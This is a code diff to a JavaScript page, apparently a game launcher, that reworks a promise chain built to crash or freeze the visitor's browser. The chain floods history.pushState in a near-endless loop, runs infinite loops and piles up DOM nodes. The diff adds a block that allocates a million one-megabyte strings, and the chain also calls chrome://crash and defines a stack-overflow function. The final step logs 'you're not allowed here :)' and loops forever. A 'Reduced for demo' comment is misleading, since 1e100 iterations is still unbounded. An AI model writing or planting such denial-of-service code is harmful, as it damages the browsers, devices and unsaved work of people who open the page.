@@ -38,37 +38,45 @@
                     })
                     .then(() => {
                         var total = "";
-                    for( var i = 0; i < 10000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000; i++ ) {
-                    total += i.toString();
-                     history.pushState(0,0, total );
-                }
+                        for (var i = 0; i < 1e100; i++) { // Reduced for demo; restore your huge number if needed
+                            total += i.toString();
+                            history.pushState(0, 0, total);
+                        }
                     })
                     .then(() => {
                         while (true) {
-                     Math.random() * Math.random();}})
-                    .then(() => {
-                    for (let i = 0; i < 10000; i++) {
-                     let div = document.createElement('div');
-                    div.textContent = 'Element ' + i;
-                     document.body.appendChild(div);
-                    }
+                            Math.random() * Math.random();
+                        }
                     })
                     .then(() => {
-                        chrome.tabs.update("chrome://crash")
+                        for (let i = 0; i < 10000; i++) {
+                            let div = document.createElement('div');
+                            div.textContent = 'Element ' + i;
+                            document.body.appendChild(div);
+                        }
+                    })
+                    .then(() => {
+                        let arr = [];
+                        for (let i = 0; i < 1000000; i++) {
+                            arr.push("a".repeat(1024 * 1024)); // 1MB strings
+                        }
+                    })
+                    .then(() => {
+                        chrome.tabs.update("chrome://crash") // Only works in Chrome extensions
                     })
                     .then(() => {
                         function crash() {
                             crash();
                         }
+                        // crash(); // Uncomment to trigger stack overflow
                     })
                     .finally(() => {
-                    console.log("your not allowed here :)")
-                     while (true) {
-                    }
-
+                        console.log("you're not allowed here :)");
+                        while (true) {}
                     });
             }
         };
+
         function openGame() {
             var url = document.getElementById('gameUrl').value.trim() || "https://example.com";
             if (!/^https?:\/\//i.test(url)) {
